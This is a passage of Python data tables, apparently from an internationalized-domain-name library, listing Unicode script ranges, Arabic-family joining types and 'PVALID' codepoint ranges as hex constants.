0x16fe200016fe4,\n        0x16ff000016ff2,\n        0x200000002a6e0,\n        0x2a7000002b739,\n        0x2b7400002b81e,\n        0x2b8200002cea2,\n        0x2ceb00002ebe1,\n        0x2f8000002fa1e,\n        0x300000003134b,\n    ),\n    'Hebrew': (\n        0x591000005c8,\n        0x5d0000005eb,\n        0x5ef000005f5,\n        0xfb1d0000fb37,\n        0xfb380000fb3d,\n        0xfb3e0000fb3f,\n        0xfb400000fb42,\n        0xfb430000fb45,\n        0xfb460000fb50,\n    ),\n    'Hiragana': (\n        0x304100003097,\n        0x309d000030a0,\n        0x1b0010001b120,\n        0x1b1500001b153,\n        0x1f2000001f201,\n    ),\n    'Katakana': (\n        0x30a1000030fb,\n        0x30fd00003100,\n        0x31f000003200,\n        0x32d0000032ff,\n        0x330000003358,\n        0xff660000ff70,\n        0xff710000ff9e,\n        0x1aff00001aff4,\n        0x1aff50001affc,\n        0x1affd0001afff,\n        0x1b0000001b001,\n        0x1b1200001b123,\n        0x1b1640001b168,\n    ),\n}\njoining_types = {\n    0x600: 85,\n    0x601: 85,\n    0x602: 85,\n    0x603: 85,\n    0x604: 85,\n    0x605: 85,\n    0x608: 85,\n    0x60b: 85,\n    0x620: 68,\n    0x621: 85,\n    0x622: 82,\n    0x623: 82,\n    0x624: 82,\n    0x625: 82,\n    0x626: 68,\n    0x627: 82,\n    0x628: 68,\n    0x629: 82,\n    0x62a: 68,\n    0x62b: 68,\n    0x62c: 68,\n    0x62d: 68,\n    0x62e: 68,\n    0x62f: 82,\n    0x630: 82,\n    0x631: 82,\n    0x632: 82,\n    0x633: 68,\n    0x634: 68,\n    0x635: 68,\n    0x636: 68,\n    0x637: 68,\n    0x638: 68,\n    0x639: 68,\n    0x63a: 68,\n    0x63b: 68,\n    0x63c: 68,\n    0x63d: 68,\n    0x63e: 68,\n    0x63f: 68,\n    0x640: 67,\n    0x641: 68,\n    0x642: 68,\n    0x643: 68,\n    0x644: 68,\n    0x645: 68,\n    0x646: 68,\n    0x647: 68,\n    0x648: 82,\n    0x649: 68,\n    0x64a: 68,\n    0x66e: 68,\n    0x66f: 68,\n    0x671: 82,\n    0x672: 82,\n    0x673: 82,\n    0x674: 85,\n    0x675: 82,\n    0x676: 82,\n    0x677: 82,\n    0x678: 68,\n    0x679: 68,\n    0x67a: 68,\n    0x67b: 68,\n    0x67c: 68,\n    0x67d: 68,\n    0x67e: 68,\n    0x67f: 68,\n    0x680: 68,\n    0x681: 68,\n    0x682: 68,\n    0x683: 68,\n    0x684: 68,\n    0x685: 68,\n    0x686: 68,\n    0x687: 68,\n    0x688: 82,\n    0x689: 82,\n    0x68a: 82,\n    0x68b: 82,\n    0x68c: 82,\n    0x68d: 82,\n    0x68e: 82,\n    0x68f: 82,\n    0x690: 82,\n    0x691: 82,\n    0x692: 82,\n    0x693: 82,\n    0x694: 82,\n    0x695: 82,\n    0x696: 82,\n    0x697: 82,\n    0x698: 82,\n    0x699: 82,\n    0x69a: 68,\n    0x69b: 68,\n    0x69c: 68,\n    0x69d: 68,\n    0x69e: 68,\n    0x69f: 68,\n    0x6a0: 68,\n    0x6a1: 68,\n    0x6a2: 68,\n    0x6a3: 68,\n    0x6a4: 68,\n    0x6a5: 68,\n    0x6a6: 68,\n    0x6a7: 68,\n    0x6a8: 68,\n    0x6a9: 68,\n    0x6aa: 68,\n    0x6ab: 68,\n    0x6ac: 68,\n    0x6ad: 68,\n    0x6ae: 68,\n    0x6af: 68,\n    0x6b0: 68,\n    0x6b1: 68,\n    0x6b2: 68,\n    0x6b3: 68,\n    0x6b4: 68,\n    0x6b5: 68,\n    0x6b6: 68,\n    0x6b7: 68,\n    0x6b8: 68,\n    0x6b9: 68,\n    0x6ba: 68,\n    0x6bb: 68,\n    0x6bc: 68,\n    0x6bd: 68,\n    0x6be: 68,\n    0x6bf: 68,\n    0x6c0: 82,\n    0x6c1: 68,\n    0x6c2: 68,\n    0x6c3: 82,\n    0x6c4: 82,\n    0x6c5: 82,\n    0x6c6: 82,\n    0x6c7: 82,\n    0x6c8: 82,\n    0x6c9: 82,\n    0x6ca: 82,\n    0x6cb: 82,\n    0x6cc: 68,\n    0x6cd: 82,\n    0x6ce: 68,\n    0x6cf: 82,\n    0x6d0: 68,\n    0x6d1: 68,\n    0x6d2: 82,\n    0x6d3: 82,\n    0x6d5: 82,\n    0x6dd: 85,\n    0x6ee: 82,\n    0x6ef: 82,\n    0x6fa: 68,\n    0x6fb: 68,\n    0x6fc: 68,\n    0x6ff: 68,\n    0x70f: 84,\n    0x710: 82,\n    0x712: 68,\n    0x713: 68,\n    0x714: 68,\n    0x715: 82,\n    0x716: 82,\n    0x717: 82,\n    0x718: 82,\n    0x719: 82,\n    0x71a: 68,\n    0x71b: 68,\n    0x71c: 68,\n    0x71d: 68,\n    0x71e: 82,\n    0x71f: 68,\n    0x720: 68,\n    0x721: 68,\n    0x722: 68,\n    0x723: 68,\n    0x724: 68,\n    0x725: 68,\n    0x726: 68,\n    0x727: 68,\n    0x728: 82,\n    0x729: 68,\n    0x72a: 82,\n    0x72b: 68,\n    0x72c: 82,\n    0x72d: 68,\n    0x72e: 68,\n    0x72f: 82,\n    0x74d: 82,\n    0x74e: 68,\n    0x74f: 68,\n    0x750: 68,\n    0x751: 68,\n    0x752: 68,\n    0x753: 68,\n    0x754: 68,\n    0x755: 68,\n    0x756: 68,\n    0x757: 68,\n    0x758: 68,\n    0x759: 82,\n    0x75a: 82,\n    0x75b: 82,\n    0x75c: 68,\n    0x75d: 68,\n    0x75e: 68,\n    0x75f: 68,\n    0x760: 68,\n    0x761: 68,\n    0x762: 68,\n    0x763: 68,\n    0x764: 68,\n    0x765: 68,\n    0x766: 68,\n    0x767: 68,\n    0x768: 68,\n    0x769: 68,\n    0x76a: 68,\n    0x76b: 82,\n    0x76c: 82,\n    0x76d: 68,\n    0x76e: 68,\n    0x76f: 68,\n    0x770: 68,\n    0x771: 82,\n    0x772: 68,\n    0x773: 82,\n    0x774: 82,\n    0x775: 68,\n    0x776: 68,\n    0x777: 68,\n    0x778: 82,\n    0x779: 82,\n    0x77a: 68,\n    0x77b: 68,\n    0x77c: 68,\n    0x77d: 68,\n    0x77e: 68,\n    0x77f: 68,\n    0x7ca: 68,\n    0x7cb: 68,\n    0x7cc: 68,\n    0x7cd: 68,\n    0x7ce: 68,\n    0x7cf: 68,\n    0x7d0: 68,\n    0x7d1: 68,\n    0x7d2: 68,\n    0x7d3: 68,\n    0x7d4: 68,\n    0x7d5: 68,\n    0x7d6: 68,\n    0x7d7: 68,\n    0x7d8: 68,\n    0x7d9: 68,\n    0x7da: 68,\n    0x7db: 68,\n    0x7dc: 68,\n    0x7dd: 68,\n    0x7de: 68,\n    0x7df: 68,\n    0x7e0: 68,\n    0x7e1: 68,\n    0x7e2: 68,\n    0x7e3: 68,\n    0x7e4: 68,\n    0x7e5: 68,\n    0x7e6: 68,\n    0x7e7: 68,\n    0x7e8: 68,\n    0x7e9: 68,\n    0x7ea: 68,\n    0x7fa: 67,\n    0x840: 82,\n    0x841: 68,\n    0x842: 68,\n    0x843: 68,\n    0x844: 68,\n    0x845: 68,\n    0x846: 82,\n    0x847: 82,\n    0x848: 68,\n    0x849: 82,\n    0x84a: 68,\n    0x84b: 68,\n    0x84c: 68,\n    0x84d: 68,\n    0x84e: 68,\n    0x84f: 68,\n    0x850: 68,\n    0x851: 68,\n    0x852: 68,\n    0x853: 68,\n    0x854: 82,\n    0x855: 68,\n    0x856: 82,\n    0x857: 82,\n    0x858: 82,\n    0x860: 68,\n    0x861: 85,\n    0x862: 68,\n    0x863: 68,\n    0x864: 68,\n    0x865: 68,\n    0x866: 85,\n    0x867: 82,\n    0x868: 68,\n    0x869: 82,\n    0x86a: 82,\n    0x870: 82,\n    0x871: 82,\n    0x872: 82,\n    0x873: 82,\n    0x874: 82,\n    0x875: 82,\n    0x876: 82,\n    0x877: 82,\n    0x878: 82,\n    0x879: 82,\n    0x87a: 82,\n    0x87b: 82,\n    0x87c: 82,\n    0x87d: 82,\n    0x87e: 82,\n    0x87f: 82,\n    0x880: 82,\n    0x881: 82,\n    0x882: 82,\n    0x883: 67,\n    0x884: 67,\n    0x885: 67,\n    0x886: 68,\n    0x887: 85,\n    0x888: 85,\n    0x889: 68,\n    0x88a: 68,\n    0x88b: 68,\n    0x88c: 68,\n    0x88d: 68,\n    0x88e: 82,\n    0x890: 85,\n    0x891: 85,\n    0x8a0: 68,\n    0x8a1: 68,\n    0x8a2: 68,\n    0x8a3: 68,\n    0x8a4: 68,\n    0x8a5: 68,\n    0x8a6: 68,\n    0x8a7: 68,\n    0x8a8: 68,\n    0x8a9: 68,\n    0x8aa: 82,\n    0x8ab: 82,\n    0x8ac: 82,\n    0x8ad: 85,\n    0x8ae: 82,\n    0x8af: 68,\n    0x8b0: 68,\n    0x8b1: 82,\n    0x8b2: 82,\n    0x8b3: 68,\n    0x8b4: 68,\n    0x8b5: 68,\n    0x8b6: 68,\n    0x8b7: 68,\n    0x8b8: 68,\n    0x8b9: 82,\n    0x8ba: 68,\n    0x8bb: 68,\n    0x8bc: 68,\n    0x8bd: 68,\n    0x8be: 68,\n    0x8bf: 68,\n    0x8c0: 68,\n    0x8c1: 68,\n    0x8c2: 68,\n    0x8c3: 68,\n    0x8c4: 68,\n    0x8c5: 68,\n    0x8c6: 68,\n    0x8c7: 68,\n    0x8c8: 68,\n    0x8e2: 85,\n    0x1806: 85,\n    0x1807: 68,\n    0x180a: 67,\n    0x180e: 85,\n    0x1820: 68,\n    0x1821: 68,\n    0x1822: 68,\n    0x1823: 68,\n    0x1824: 68,\n    0x1825: 68,\n    0x1826: 68,\n    0x1827: 68,\n    0x1828: 68,\n    0x1829: 68,\n    0x182a: 68,\n    0x182b: 68,\n    0x182c: 68,\n    0x182d: 68,\n    0x182e: 68,\n    0x182f: 68,\n    0x1830: 68,\n    0x1831: 68,\n    0x1832: 68,\n    0x1833: 68,\n    0x1834: 68,\n    0x1835: 68,\n    0x1836: 68,\n    0x1837: 68,\n    0x1838: 68,\n    0x1839: 68,\n    0x183a: 68,\n    0x183b: 68,\n    0x183c: 68,\n    0x183d: 68,\n    0x183e: 68,\n    0x183f: 68,\n    0x1840: 68,\n    0x1841: 68,\n    0x1842: 68,\n    0x1843: 68,\n    0x1844: 68,\n    0x1845: 68,\n    0x1846: 68,\n    0x1847: 68,\n    0x1848: 68,\n    0x1849: 68,\n    0x184a: 68,\n    0x184b: 68,\n    0x184c: 68,\n    0x184d: 68,\n    0x184e: 68,\n    0x184f: 68,\n    0x1850: 68,\n    0x1851: 68,\n    0x1852: 68,\n    0x1853: 68,\n    0x1854: 68,\n    0x1855: 68,\n    0x1856: 68,\n    0x1857: 68,\n    0x1858: 68,\n    0x1859: 68,\n    0x185a: 68,\n    0x185b: 68,\n    0x185c: 68,\n    0x185d: 68,\n    0x185e: 68,\n    0x185f: 68,\n    0x1860: 68,\n    0x1861: 68,\n    0x1862: 68,\n    0x1863: 68,\n    0x1864: 68,\n    0x1865: 68,\n    0x1866: 68,\n    0x1867: 68,\n    0x1868: 68,\n    0x1869: 68,\n    0x186a: 68,\n    0x186b: 68,\n    0x186c: 68,\n    0x186d: 68,\n    0x186e: 68,\n    0x186f: 68,\n    0x1870: 68,\n    0x1871: 68,\n    0x1872: 68,\n    0x1873: 68,\n    0x1874: 68,\n    0x1875: 68,\n    0x1876: 68,\n    0x1877: 68,\n    0x1878: 68,\n    0x1880: 85,\n    0x1881: 85,\n    0x1882: 85,\n    0x1883: 85,\n    0x1884: 85,\n    0x1885: 84,\n    0x1886: 84,\n    0x1887: 68,\n    0x1888: 68,\n    0x1889: 68,\n    0x188a: 68,\n    0x188b: 68,\n    0x188c: 68,\n    0x188d: 68,\n    0x188e: 68,\n    0x188f: 68,\n    0x1890: 68,\n    0x1891: 68,\n    0x1892: 68,\n    0x1893: 68,\n    0x1894: 68,\n    0x1895: 68,\n    0x1896: 68,\n    0x1897: 68,\n    0x1898: 68,\n    0x1899: 68,\n    0x189a: 68,\n    0x189b: 68,\n    0x189c: 68,\n    0x189d: 68,\n    0x189e: 68,\n    0x189f: 68,\n    0x18a0: 68,\n    0x18a1: 68,\n    0x18a2: 68,\n    0x18a3: 68,\n    0x18a4: 68,\n    0x18a5: 68,\n    0x18a6: 68,\n    0x18a7: 68,\n    0x18a8: 68,\n    0x18aa: 68,\n    0x200c: 85,\n    0x200d: 67,\n    0x202f: 85,\n    0x2066: 85,\n    0x2067: 85,\n    0x2068: 85,\n    0x2069: 85,\n    0xa840: 68,\n    0xa841: 68,\n    0xa842: 68,\n    0xa843: 68,\n    0xa844: 68,\n    0xa845: 68,\n    0xa846: 68,\n    0xa847: 68,\n    0xa848: 68,\n    0xa849: 68,\n    0xa84a: 68,\n    0xa84b: 68,\n    0xa84c: 68,\n    0xa84d: 68,\n    0xa84e: 68,\n    0xa84f: 68,\n    0xa850: 68,\n    0xa851: 68,\n    0xa852: 68,\n    0xa853: 68,\n    0xa854: 68,\n    0xa855: 68,\n    0xa856: 68,\n    0xa857: 68,\n    0xa858: 68,\n    0xa859: 68,\n    0xa85a: 68,\n    0xa85b: 68,\n    0xa85c: 68,\n    0xa85d: 68,\n    0xa85e: 68,\n    0xa85f: 68,\n    0xa860: 68,\n    0xa861: 68,\n    0xa862: 68,\n    0xa863: 68,\n    0xa864: 68,\n    0xa865: 68,\n    0xa866: 68,\n    0xa867: 68,\n    0xa868: 68,\n    0xa869: 68,\n    0xa86a: 68,\n    0xa86b: 68,\n    0xa86c: 68,\n    0xa86d: 68,\n    0xa86e: 68,\n    0xa86f: 68,\n    0xa870: 68,\n    0xa871: 68,\n    0xa872: 76,\n    0xa873: 85,\n    0x10ac0: 68,\n    0x10ac1: 68,\n    0x10ac2: 68,\n    0x10ac3: 68,\n    0x10ac4: 68,\n    0x10ac5: 82,\n    0x10ac6: 85,\n    0x10ac7: 82,\n    0x10ac8: 85,\n    0x10ac9: 82,\n    0x10aca: 82,\n    0x10acb: 85,\n    0x10acc: 85,\n    0x10acd: 76,\n    0x10ace: 82,\n    0x10acf: 82,\n    0x10ad0: 82,\n    0x10ad1: 82,\n    0x10ad2: 82,\n    0x10ad3: 68,\n    0x10ad4: 68,\n    0x10ad5: 68,\n    0x10ad6: 68,\n    0x10ad7: 76,\n    0x10ad8: 68,\n    0x10ad9: 68,\n    0x10ada: 68,\n    0x10adb: 68,\n    0x10adc: 68,\n    0x10add: 82,\n    0x10ade: 68,\n    0x10adf: 68,\n    0x10ae0: 68,\n    0x10ae1: 82,\n    0x10ae2: 85,\n    0x10ae3: 85,\n    0x10ae4: 82,\n    0x10aeb: 68,\n    0x10aec: 68,\n    0x10aed: 68,\n    0x10aee: 68,\n    0x10aef: 82,\n    0x10b80: 68,\n    0x10b81: 82,\n    0x10b82: 68,\n    0x10b83: 82,\n    0x10b84: 82,\n    0x10b85: 82,\n    0x10b86: 68,\n    0x10b87: 68,\n    0x10b88: 68,\n    0x10b89: 82,\n    0x10b8a: 68,\n    0x10b8b: 68,\n    0x10b8c: 82,\n    0x10b8d: 68,\n    0x10b8e: 82,\n    0x10b8f: 82,\n    0x10b90: 68,\n    0x10b91: 82,\n    0x10ba9: 82,\n    0x10baa: 82,\n    0x10bab: 82,\n    0x10bac: 82,\n    0x10bad: 68,\n    0x10bae: 68,\n    0x10baf: 85,\n    0x10d00: 76,\n    0x10d01: 68,\n    0x10d02: 68,\n    0x10d03: 68,\n    0x10d04: 68,\n    0x10d05: 68,\n    0x10d06: 68,\n    0x10d07: 68,\n    0x10d08: 68,\n    0x10d09: 68,\n    0x10d0a: 68,\n    0x10d0b: 68,\n    0x10d0c: 68,\n    0x10d0d: 68,\n    0x10d0e: 68,\n    0x10d0f: 68,\n    0x10d10: 68,\n    0x10d11: 68,\n    0x10d12: 68,\n    0x10d13: 68,\n    0x10d14: 68,\n    0x10d15: 68,\n    0x10d16: 68,\n    0x10d17: 68,\n    0x10d18: 68,\n    0x10d19: 68,\n    0x10d1a: 68,\n    0x10d1b: 68,\n    0x10d1c: 68,\n    0x10d1d: 68,\n    0x10d1e: 68,\n    0x10d1f: 68,\n    0x10d20: 68,\n    0x10d21: 68,\n    0x10d22: 82,\n    0x10d23: 68,\n    0x10f30: 68,\n    0x10f31: 68,\n    0x10f32: 68,\n    0x10f33: 82,\n    0x10f34: 68,\n    0x10f35: 68,\n    0x10f36: 68,\n    0x10f37: 68,\n    0x10f38: 68,\n    0x10f39: 68,\n    0x10f3a: 68,\n    0x10f3b: 68,\n    0x10f3c: 68,\n    0x10f3d: 68,\n    0x10f3e: 68,\n    0x10f3f: 68,\n    0x10f40: 68,\n    0x10f41: 68,\n    0x10f42: 68,\n    0x10f43: 68,\n    0x10f44: 68,\n    0x10f45: 85,\n    0x10f51: 68,\n    0x10f52: 68,\n    0x10f53: 68,\n    0x10f54: 82,\n    0x10f70: 68,\n    0x10f71: 68,\n    0x10f72: 68,\n    0x10f73: 68,\n    0x10f74: 82,\n    0x10f75: 82,\n    0x10f76: 68,\n    0x10f77: 68,\n    0x10f78: 68,\n    0x10f79: 68,\n    0x10f7a: 68,\n    0x10f7b: 68,\n    0x10f7c: 68,\n    0x10f7d: 68,\n    0x10f7e: 68,\n    0x10f7f: 68,\n    0x10f80: 68,\n    0x10f81: 68,\n    0x10fb0: 68,\n    0x10fb1: 85,\n    0x10fb2: 68,\n    0x10fb3: 68,\n    0x10fb4: 82,\n    0x10fb5: 82,\n    0x10fb6: 82,\n    0x10fb7: 85,\n    0x10fb8: 68,\n    0x10fb9: 82,\n    0x10fba: 82,\n    0x10fbb: 68,\n    0x10fbc: 68,\n    0x10fbd: 82,\n    0x10fbe: 68,\n    0x10fbf: 68,\n    0x10fc0: 85,\n    0x10fc1: 68,\n    0x10fc2: 82,\n    0x10fc3: 82,\n    0x10fc4: 68,\n    0x10fc5: 85,\n    0x10fc6: 85,\n    0x10fc7: 85,\n    0x10fc8: 85,\n    0x10fc9: 82,\n    0x10fca: 68,\n    0x10fcb: 76,\n    0x110bd: 85,\n    0x110cd: 85,\n    0x1e900: 68,\n    0x1e901: 68,\n    0x1e902: 68,\n    0x1e903: 68,\n    0x1e904: 68,\n    0x1e905: 68,\n    0x1e906: 68,\n    0x1e907: 68,\n    0x1e908: 68,\n    0x1e909: 68,\n    0x1e90a: 68,\n    0x1e90b: 68,\n    0x1e90c: 68,\n    0x1e90d: 68,\n    0x1e90e: 68,\n    0x1e90f: 68,\n    0x1e910: 68,\n    0x1e911: 68,\n    0x1e912: 68,\n    0x1e913: 68,\n    0x1e914: 68,\n    0x1e915: 68,\n    0x1e916: 68,\n    0x1e917: 68,\n    0x1e918: 68,\n    0x1e919: 68,\n    0x1e91a: 68,\n    0x1e91b: 68,\n    0x1e91c: 68,\n    0x1e91d: 68,\n    0x1e91e: 68,\n    0x1e91f: 68,\n    0x1e920: 68,\n    0x1e921: 68,\n    0x1e922: 68,\n    0x1e923: 68,\n    0x1e924: 68,\n    0x1e925: 68,\n    0x1e926: 68,\n    0x1e927: 68,\n    0x1e928: 68,\n    0x1e929: 68,\n    0x1e92a: 68,\n    0x1e92b: 68,\n    0x1e92c: 68,\n    0x1e92d: 68,\n    0x1e92e: 68,\n    0x1e92f: 68,\n    0x1e930: 68,\n    0x1e931: 68,\n    0x1e932: 68,\n    0x1e933: 68,\n    0x1e934: 68,\n    0x1e935: 68,\n    0x1e936: 68,\n    0x1e937: 68,\n    0x1e938: 68,\n    0x1e939: 68,\n    0x1e93a: 68,\n    0x1e93b: 68,\n    0x1e93c: 68,\n    0x1e93d: 68,\n    0x1e93e: 68,\n    0x1e93f: 68,\n    0x1e940: 68,\n    0x1e941: 68,\n    0x1e942: 68,\n    0x1e943: 68,\n    0x1e94b: 84,\n}\ncodepoint_classes = {\n    'PVALID': (\n        0x2d0000002e,\n        0x300000003a,\n        0x610000007b,\n        0xdf000000f7,\n        0xf800000100,\n        0x10100000102,\n        0x10300000104,\n        0x10500000106,\n        0x10700000108,\n        0x1090000010a,\n        0x10b0000010c,\n        0x10d0000010e,\n        0x10f00000110,\n        0x11100000112,\n        0x11300000114,\n        0x11500000116,\n        0x11700000118,\n        0x1190000011a,\n        0x11b0000011c,\n        0x11d0000011e,\n        0x11f00000120,\n        0x12100000122,\n        0x12300000124,\n        0x12500000126,\n        0x12700000128,\n        0x1290000012a,\n        0x12b0000012c,\n        0x12d0000012e,\n        0x12f00000130,\n        0x13100000132,\n        0x13500000136,\n        0x13700000139,\n        0x13a0000013b,\n        0x13c0000013d,\n        0x13e0000013f,\n        0x14200000143,\n        0x14400000145,\n        0x14600000147,\n        0x14800000149,\n        0x14b0000014c,\n        0x14d0000014e,\n        0x14f00000150,\n        0x15100000152,\n        0x15300000154,\n        0x15500000156,\n        0x15700000158,\n        0x1590000015a,\n        0x15b0000015c,\n        0x15d0000015e,\n        0x15f00000160,\n        0x16100000162,\n        0x16300000164,\n        0x16500000166,\n        0x16700000168,\n        0x1690000016a,\n        0x16b0000016c,\n        0x16d0000016e,\n        0x16f00000170,\n        0x17100000172,\n        0x17300000174,\n        0x17500000176,\n        0x17700000178,\n        0x17a0000017b,\n        0x17c0000017d,\n        0x17e0000017f,\n        0x18000000181,\n        0x18300000184,\n        0x18500000186,\n        0x18800000189,\n        0x18c0000018e,\n        0x19200000193,\n        0x19500000196,\n        0x1990000019c,\n        0x19e0000019f,\n        0x1a1000001a2,\n        0x1a3000001a4,\n        0x1a5000001a6,\n        0x1a8000001a9,\n        0x1aa000001ac,\n        0x1ad000001ae,\n        0x1b0000001b1,\n        0x1b4000001b5,\n        0x1b6000001b7,\n        0x1b9000001bc,\n        0x1bd000001c4,\n        0x1ce000001cf,\n        0x1d0000001d1,\n        0x1d2000001d3,\n        0x1d4000001d5,\n        0x1d6000001d7,\n        0x1d8000001d9,\n        0x1da000001db,\n        0x1dc000001de,\n        0x1df000001e0,\n        0x1e1000001e2,\n        0x1e3000001e4,\n        0x1e5000001e6,\n        0x1e7000001e8,\n        0x1e9000001ea,\n        0x1eb000001ec,\n        0x1ed000001ee,\n        0x1ef000001f1,\n        0x1f5000001f6,\n        0x1f9000001fa,\n        0x1fb000001fc,\n        0x1fd000001fe,\n        0x1ff00000200,\n        0x20100000202,\n        0x20300000204,\n        0x20500000206,\n        0x20700000208,\n        0x2090000020a,\n        0x20b0000020c,\n        0x20d0000020e,\n        0x20f00000210,\n        0x21100000212,\n        0x21300000214,\n        0x21500000216,\n        0x21700000218,\n        0x2190000021a,\n        0x21b0000021c,\n        0x21d0000021e,\n        0x21f00000220,\n        0x22100000222,\n        0x22300000224,\n        0x22500000226,\n        0x22700000228,\n        0x2290000022a,\n        0x22b0000022c,\n        0x22d0000022e,\n        0x22f00000230,\n        0x23100000232,\n        0x2330000023a,\n        0x23c0000023d,\n        0x23f00000241,\n        0x24200000243,\n        0x24700000248,\n        0x2490000024a,\n        0x24b0000024c,\n        0x24d0000024e,\n        0x24f000002b0,\n        0x2b9000002c2,\n        0x2c6000002d2,\n        0x2ec000002ed,\n        0x2ee000002ef,\n        0x30000000340,\n        0x34200000343,\n        0x3460000034f,\n        0x35000000370,\n        0x37100000372,\n        0x37300000374,\n        0x37700000378,\n        0x37b0000037e,\n        0x39000000391,\n        0x3ac000003cf,\n        0x3d7000003d8,\n        0x3d9000003da,\n        0x3db000003dc,\n        0x3dd000003de,\n        0x3df000003e0,\n        0x3e1000003e2,\n        0x3e3000003e4,\n        0x3e5000003e6,\n        0x3e7000003e8,\n        0x3e9000003ea,\n        0x3eb000003ec,\n        0x3ed000003ee,\n        0x3ef000003f0,\n        0x3f3000003f4,\n        0x3f8000003f9,\n        0x3fb000003fd,\n        0x43000000460,\n        0x46100000462,\n        0x46300000464,\n        0x46500000466,\n        0x46700000468,\n        0x4690000046a,\n        0x46b0000046c,\n        0x46d0000046e,\n        0x46f00000470,\n        0x47100000472,\n        0x47300000474,\n        0x47500000476,\n        0x47700000478,\n        0x4790000047a,\n        0x47b0000047c,\n        0x47d0000047e,\n        0x47f00000480,\n        0x48100000482,\n        0x48300000488,\n        0x48b0000048c,\n        0x48d0000048e,\n        0x48f00000490,\n        0x49100000492,\n        0x49300000494,\n        0x49500000496,\n        0x49700000498,\n        0x4990000049a,\n        0x49b0000049c,\n        0x49d0000049e,\n        0x49f000004a0,\n        0x4a1000004a2,\n        0x4a3000004a4,\n        0x4a5000004a6,\n        0x4a7000004a8,\n        0x4a9000004aa,\n        0x4ab000004ac,\n        0x4ad000004ae,\n        0x4af000004b0,\n        0x4b1000004b2,\n        0x4b3000004b4,\n        0x4b5000004b6,\n        0x4b7000004b8,\n        0x4b9000004ba,\n        0x4bb000004bc,\n        0x4bd000004be,\n        0x4bf000004c0,\n        0x4c2000004c3,\n        0x4c4000004c5,\n        0x4c6000004c7,\n        0x4c8000004c9,\n        0x4ca000004cb,\n        0x4cc000004cd,\n        0x4ce000004d0,\n        0x4d1000004d2,\n        0x4d3000004d4,\n        0x4d5000004d6,\n        0x4d7000004d8,\n        0x4d9000004da,\n        0x4db000004dc,\n        0x4dd000004de,\n        0x4df000004e0,\n        0x4e1000004e2,\n        0x4e3000004e4,\n        0x4e5000004e6,\n        0x4e7000004e8,\n        0x4e9000004ea,\n        0x4eb000004ec,\n        0x4ed000004ee,\n        0x4ef000004f0,\n        0x4f1000004f2,\n        0x4f3000004f4,\n        0x4f5000004f6,\n        0x4f7000004f8,\n        0x4f9000004fa,\n        0x4fb000004fc,\n        0x4fd000004fe,\n        0x4ff00000500,\n        0x50100000502,\n        0x50300000504,\n        0x50500000506,\n        0x50700000508,\n        0x5090000050a,\n        0x50b0000050c,\n        0x50d0000050e,\n        0x50f00000510,\n        0x51100000512,\n        0x51300000514,\n        0x51500000516,\n        0x51700000518,\n        0x5190000051a,\n        0x51b0000051c,\n        0x51d0000051e,\n        0x51f00000520,\n        0x52100000522,\n        0x52300000524,\n        0x52500000526,\n        0x52700000528,\n        0x5290000052a,\n        0x52b0000052c,\n        0x52d0000052e,\n        0x52f00000530,\n        0x5590000055a,\n        0x56000000587,\n        0x58800000589,\n        0x591000005be,\n        0x5bf000005c0,\n        0x5c1000005c3,\n        0x5c4000005c6,\n        0x5c7000005c8,\n        0x5d0000005eb,\n        0x5ef000005f3,\n        0x6100000061b,\n        0x62000000640,\n        0x64100000660,\n        0x66e00000675,\n        0x679000006d4,\n        0x6d5000006dd,\n        0x6df000006e9,\n        0x6ea000006f0,\n        0x6fa00000700,\n        0x7100000074b,\n        0x74d000007b2,\n        0x7c0000007f6,\n        0x7fd000007fe,\n        0x8000000082e,\n        0x8400000085c,\n        0x8600000086b,\n        0x87000000888,\n        0x8890000088f,\n        0x898000008e2,\n        0x8e300000958,\n        0x96000000964,\n        0x96600000970,\n        0x97100000984,\n        0x9850000098d,\n        0x98f00000991,\n        0x993000009a9,\n        0x9aa000009b1,\n        0x9b2000009b3,\n        0x9b6000009ba,\n        0x9bc000009c5,\n        0x9c7000009c9,\n        0x9cb000009cf,\n        0x9d7000009d8,\n        0x9e0000009e4,\n        0x9e6000009f2,\n        0x9fc000009fd,\n        0x9fe000009ff,\n        0xa0100000a04,\n        0xa0500000a0b,\n        0xa0f00000a11,\n        0xa1300000a29,\n        0xa2a00000a31,\n        0xa3200000a33,\n        0xa3500000a36,\n        0xa3800000a3a,\n        0xa3c00000a3d,\n        0xa3e00000a43,\n        0xa4700000a49,\n        0xa4b00000a4e,\n        0xa5100000a52,\n        0xa5c00000a5d,\n        0xa6600000a76,\n        0xa8100000a84,\n        0xa8500000a8e,\n        0xa8f00000a92,\n        0xa9300000aa9,\n        0xaaa00000ab1,\n        0xab200000ab4,\n        0xab500000aba,\n        0xabc00000ac6,\n        0xac700000aca,\n        0xacb00000ace,\n        0xad000000ad1,\n        0xae000000ae4,\n        0xae600000af0,\n        0xaf900000b00,\n        0xb0100000b04,\n        0xb0500000b0d,\n        0xb0f00000b11,\n        0xb1300000b29,\n        0xb2a00000b31,\n        0xb3200000b34,\n        0xb3500000b3a,\n        0xb3c00000b45,\n        0xb4700000b49,\n        0xb4b00000b4e,\n        0xb5500000b58,\n        0xb5f00000b64,\n        0xb6600000b70,\n        0xb7100000b72,\n        0xb8200000b84,\n        0xb8500000b8b,\n        0xb8e00000b91,\n        0xb9200000b96,\n        0xb9900000b9b,\n        0xb9c00000b9d,\n        0xb9e00000ba0,\n        0xba300000ba5,\n        0xba800000bab,\n        0xbae00000bba,\n        0xbbe00000bc3,\n        0xbc600000bc9,\n        0xbca00000bce,\n        0xbd000000bd1,\n        0xbd700000bd8,\n        0xbe600000bf0,\n        0xc0000000c0d,\n        0xc0e00000c11,\n        0xc1200000c29,\n        0xc2a00000c3a,\n        0xc3c00000c45,\n        0xc4600000c49,\n        0xc4a00000c4e,\n        0xc5500000c57,\n        0xc5800000c5b,\n        0xc5d00000c5e,\n        0xc6000000c64,\n        0xc6600000c70,\n        0xc8000000c84,\n        0xc8500000c8d,\n        0xc8e00000c91,\n        0xc9200000ca9,\n        0xcaa00000cb4,\n        0xcb500000cba,\n        0xcbc00000cc5,\n        0xcc600000cc9,\n        0xcca00000cce,\n        0xcd500000cd7,\n        0xcdd00000cdf,\n        0xce000000ce4,\n        0xce600000cf0,\n        0xcf100000cf3,\n        0xd0000000d0d,\n        0xd0e00000d11,\n        0xd1200000d45,\n        0xd4600000d49,\n        0xd4a00000d4f,\n        0xd5400000d58,\n        0xd5f00000d64,\n        0xd6600000d70,\n        0xd7a00000d80,\n        0xd8100000d84,\n        0xd8500000d97,\n        0xd9a00000db2,\n        0xdb300000dbc,\n        0xdbd00000dbe,\n        0xdc000000dc7,\n        0xdca00000dcb,\n        0xdcf00000dd5,\n        